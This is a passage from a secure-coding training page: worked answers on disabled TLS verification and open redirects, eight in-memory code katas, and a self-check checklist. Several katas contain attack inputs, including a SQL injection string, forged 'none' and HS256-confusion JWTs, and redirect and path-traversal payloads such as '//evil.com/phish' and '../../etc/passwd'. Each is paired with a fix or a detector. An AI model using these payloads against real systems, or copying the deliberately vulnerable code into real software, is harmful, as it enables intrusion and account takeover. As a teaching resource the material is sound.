`ssl.SSLContext` where `context.check_hostname = False` and `context.verify_mode = ssl.CERT_NONE`, added
months ago "to fix a certificate error during a network migration" and never reverted. Describe the
exposure this leaves open, in terms of what an attacker positioned on the network path could now do.

<details>
<summary>Worked solution</summary>

With hostname checking and certificate verification both disabled, the TLS handshake succeeds against
ANY certificate presented by ANY server, including one an attacker generates on the fly -- so an attacker
who can intercept the connection (a compromised router, a rogue Wi-Fi AP, DNS poisoning) can present their
own certificate, have the client accept it without complaint, and transparently proxy every request and
response, including the partner's actual payment-status data, while both ends believe the connection is
secure (co-18). The fix is removing the override and properly addressing the ORIGINAL certificate error
(installing the correct CA certificate, fixing a hostname mismatch, or renewing an expired cert) rather
than disabling the check that exists to catch exactly this interception.

</details>

**AP15.** A ticket-resale platform's security team triages a new report: "a crafted post-purchase
confirmation link with `?receipt_url=` sends buyers to a look-alike phishing page after a real,
successful purchase." One engineer says "this can't be serious, nothing was actually hacked -- the
purchase went through correctly, and the code that handles `receipt_url` has no bugs in it." How would a
security engineer categorize this finding, and is the "nothing was hacked" framing accurate?

<details>
<summary>Worked solution</summary>

This is an open redirect: `receipt_url` is followed without validating that its target stays on the
platform's own domain, letting an attacker construct a link that performs a completely legitimate
purchase and then redirects the victim off-site to a phishing page -- exactly why it's convincing (co-28).
Mapped against OWASP Top 10:2025, this falls under A06 Insecure Design (the missing redirect-target
validation is an absent design safeguard, not a broken implementation of an otherwise-correct spec)
(co-02). The "nothing was hacked, no bug in the code" framing is itself the mistake: no line of code is
malfunctioning, but the FEATURE'S design never accounted for an untrusted redirect target, which is
precisely what makes it a real, exploitable finding despite looking clean at the code level (co-25).

</details>

## Code katas

Eight self-contained exercises. Every kata runs on in-memory data, preferring stdlib where possible and
otherwise using only this topic's own already-pinned third-party toolchain (argon2-cffi 25.1.0, PyJWT
2.13.0, Flask 3.1.3's in-process test client) exactly as already installed for the learning track -- no
live network listener, no real database server, no root access, and no external service required, so
every kata is runnable anywhere this topic's pinned toolchain (Python 3.13.12) is installed, with nothing
else to set up.

### Kata 1 -- Exploit and fix a SQL injection in an in-memory database

Build a small `sqlite3` `:memory:` database with a `users` table (`id`, `username`, `is_admin`), seeded
with two or three rows. Write a function `find_user(conn, username: str)` that builds its query with an
f-string (`f"SELECT * FROM users WHERE username = '{username}'"`). Call it with the username value
`"' OR '1'='1"` and confirm it returns every row instead of zero (co-01, co-03). Then rewrite the SAME
function to use a parameterized query (`?` placeholder) and confirm the identical payload string now
correctly returns zero rows.

### Kata 2 -- Argon2id hash, verify, and a rehash-required drill

Using `argon2-cffi` 25.1.0, hash the same password string twice with `PasswordHasher().hash(...)` and
confirm the two resulting `$argon2id$` strings differ (co-10). Use `PasswordHasher().verify(...)` to
confirm both hashes correctly verify against the original password, and that a wrong password raises
`VerifyMismatchError` against either hash (co-09). Finally, construct a second `PasswordHasher` instance
with deliberately weaker parameters (e.g. a lower `time_cost`), hash a password with it, and confirm your
machine's default-parameter `PasswordHasher().check_needs_rehash(weak_hash)` returns `True`.

### Kata 3 -- Time an insecure vs. constant-time comparison and observe the leak

Write two comparison functions, one using Python's `==` and one using `hmac.compare_digest`, each
comparing a fixed 32-character secret against a guessed string. For each function, measure the average
time (over many repetitions, using `time.perf_counter()`) to reject a guess sharing 0 correct leading
characters versus a guess sharing 31 of 32 correct leading characters. Confirm the `==` version shows a
measurable timing difference between the two cases, and the `compare_digest` version does not, within
measurement noise (co-11).

### Kata 4 -- Forge and correctly reject a JWT algorithm-confusion token

Using `PyJWT` 2.13.0, generate a real RSA keypair, sign a legitimate token with the private key, and
verify it correctly with `algorithms=["RS256"]`. Then build two forged tokens by hand: one with `alg` set
to `none` and no signature, and one signed with HS256 using the RSA public key's PEM bytes as the HMAC
secret. Confirm a verifier that pins `algorithms=["RS256"]` rejects both forgeries. As a controlled
negative case only (never write code like this outside this drill), also build a verifier that reads the
token's own `alg` header and, only when it says `HS256`, hand-computes the HMAC using the RSA public
key's PEM bytes as the secret instead of ever calling `jwt.decode()` for that branch; confirm it accepts
the HS256-forged token from above, then confirm a verifier that calls
`jwt.decode(token, public_key, algorithms=["RS256"])` unconditionally rejects the same forged token
(co-14).

### Kata 5 -- Build a minimal CSRF token check with Flask's in-process test client

Using Flask 3.1.3's `app.test_client()` (no real network listener), build a tiny two-route app: a GET
route that renders a form containing a random per-session CSRF token, stored server-side in a dict keyed
by a session id you set yourself as a cookie with `Secure`, `HttpOnly`, and `SameSite=Lax` flags (co-13);
and a POST route that only succeeds if the submitted token matches the session's stored token. Using the
test client, confirm a POST with the correct token succeeds, and a POST simulating a forged cross-site
request (no token, or a guessed wrong token) is rejected (co-26).

### Kata 6 -- Detect an open redirect and a path-traversal target with one allow-list pattern

Write a function `is_safe_redirect(target: str) -> bool` that only accepts a `next=` value if it's a
relative path (no scheme, no netloc -- check with `urllib.parse.urlsplit`) and doesn't itself contain
`..` segments. Test it against at least five payloads: a legitimate relative path, a `//evil.com/phish`
scheme-relative payload, a full `https://evil.com` URL, a path containing `../../etc/passwd`, and a path
that looks relative but decodes (via `urllib.parse.unquote`) to something containing `..`. Confirm your
function's allow/deny decision matches the expected answer for every case, including the trickiest last
one (co-05, co-07, co-28).

### Kata 7 -- Detect a typosquatted dependency name without touching the network

Build a small allow-list of five legitimate package names of your own choosing. Write a function
`nearest_known_name(candidate: str, known: list[str]) -> tuple[str, int]` using a hand-rolled
edit-distance calculation -- no external library, no network lookup. Test it against at least four
deliberately typosquatted candidate strings (a single swapped character, a single inserted character, a
single deleted character, and a two-adjacent-letters swap) and confirm each one's closest match and
distance correctly flags it as suspiciously close to a real package name, while a genuinely unrelated
string does not (co-21, co-25).

### Kata 8 -- Log a failed-login event safely and add a brute-force alert rule on top

Write a function `record_login_attempt(username: str, success: bool, ip: str) -> None` that appends a
structured record to an in-memory list, containing only username, outcome, timestamp, and IP --
deliberately never even accepting the attempted password as a parameter, so it structurally CANNOT leak
it (co-17, co-22). Then write a function
`check_brute_force(attempts: list, window_seconds: int, threshold: int) -> list[str]` that scans the
recorded attempts and returns the IPs with more than `threshold` failed attempts within any rolling
`window_seconds` window. Simulate 50 failed logins from one IP within a short window and confirm your
function flags exactly that IP (co-27).

## Self-check checklist

Confirm each item without checking the learning track first. If you hesitate, that concept needs
another pass.

- [ ] I can explain why data crossing into your code from a partner API, upstream response, or queue
      message is still a trust boundary, regardless of who nominally sent it. (co-01)
- [ ] I can explain what mapping a bug to an OWASP Top 10:2025 category adds beyond a plain bug-tracker
      entry. (co-02)
- [ ] I can explain why escaping a single dangerous character is a weaker fix for SQL injection than a
      parameterized query, and why. (co-03)
- [ ] I can explain how `shell=True` command construction lets a shell metacharacter inject a second
      command, and the argv-list fix that removes the shell entirely. (co-04)
- [ ] I can explain why canonicalizing a joined file path is not enough by itself to stop path
      traversal, and the second check it needs. (co-05)
- [ ] I can explain why HTML-body output encoding does not also protect a value inserted into a
      JavaScript string context on the same page. (co-06)
- [ ] I can explain why a deny-list of dangerous file extensions misses cases an allow-list would have
      caught automatically. (co-07)
- [ ] I can explain how unpacking an entire request body onto a model's constructor lets a client set
      fields no legitimate UI ever exposes. (co-08)
- [ ] I can explain why a fast general-purpose hash like SHA-256 is the wrong choice for password
      storage, even though it is cryptographically sound. (co-09)
- [ ] I can explain what identical hashes for identical passwords let an attacker do, and what a unique
      per-hash salt changes about that. (co-10)
- [ ] I can explain why `==` leaks timing information during a secret comparison, and what
      `hmac.compare_digest` does differently. (co-11)
- [ ] I can explain the revocation-versus-scale trade-off between server-side sessions and stateless
      tokens. (co-12)
- [ ] I can name which cookie flag stops a JS-readable session theft and which stops transmission over
      plain HTTP, and explain why they are independent controls. (co-13)
- [ ] I can explain why a hand-rolled verifier that dispatches on the token's own `alg` header (rather
      than always calling `jwt.decode(..., algorithms=[...])`) is vulnerable to algorithm confusion, even
      though `jwt.decode()` itself fails closed when `algorithms=` is omitted. (co-14)
- [ ] I can explain why a missing permission check is an authorization bug even when the request's
      authentication was entirely correct. (co-15)
- [ ] I can explain why the specific database/service credentials a component connects with bound the
      blast radius of an unrelated vulnerability in that component. (co-16)
- [ ] I can explain why a secret that was ever committed to a repository must still be rotated, even
      after the commit is removed via a force-push. (co-17)
- [ ] I can explain what protection `verify=False` actually removes from a TLS connection, and why
      encryption alone is not the same guarantee. (co-18)
- [ ] I can name the specific header/directive responsible for blocking clickjacking, and explain why a
      strict CSP does not automatically cover it. (co-19)
- [ ] I can explain why reflecting any `Origin` back as allowed, combined with allowing credentials,
      lets a malicious site read another user's authenticated data. (co-20)
- [ ] I can explain why a clean `pip-audit` run does not guarantee protection against a CVE disclosed
      after that run. (co-21)
- [ ] I can explain why logging the actual attempted credential value is itself a security problem,
      independent of whether failed logins should be logged. (co-22)
- [ ] I can name two distinct things wrong with an error response that leaks internal implementation
      detail, and what should replace it. (co-23)
- [ ] I can explain why a production instance left in an insecure default state is a configuration
      problem rather than a code-level vulnerability, and why that distinction changes the fix. (co-24)
- [ ] I can explain why a feature where every line of code behaves exactly as specified can still be
      exploitable, and what kind of fix that requires. (co-25)
- [ ] I can explain why a browser attaches a valid session cookie to a forged cross-site request, and
      what a CSRF token adds that the cookie alone doesn't provide. (co-26)
- [ ] I can explain the trade-off between a hard account lockout and exponential backoff as brute-force
      defenses. (co-27)
- [ ] I can explain why a redirect target must be validated even when the initial link's domain is
      genuinely legitimate. (co-28)

---

← Previous: [Capstone](../learning/capstone/overview.md) · Next: [Technical Communication](../../technical-communication/learning/overview.md) →
